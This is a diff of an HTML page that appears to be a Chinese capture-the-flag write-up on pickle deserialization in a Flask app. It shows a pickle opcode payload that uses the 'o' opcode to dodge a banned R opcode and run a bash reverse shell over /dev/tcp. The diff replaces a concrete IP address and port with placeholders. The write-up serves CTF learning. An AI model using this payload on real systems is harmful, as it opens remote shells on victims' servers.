@@ -495,13 +495,13 @@
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>接下来就是pickle反序列化了，</p>
-<p>可以看到有个check函数，大佬们的wp是R指令绕过反弹shell，应该是R指令被ban了</p>
+<p>可以看到有个check函数，大佬们的wp是用o指令进行R指令绕过反弹shell，应该是R指令被ban了</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session
 <span class="token keyword">import</span> base64
 
 opcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cos
 system
-S'bash -c "bash -i >&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1"'
+S'bash -c "bash -i >&amp; /dev/tcp/your_ip/port &lt;&amp;1"'
 o.'''</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
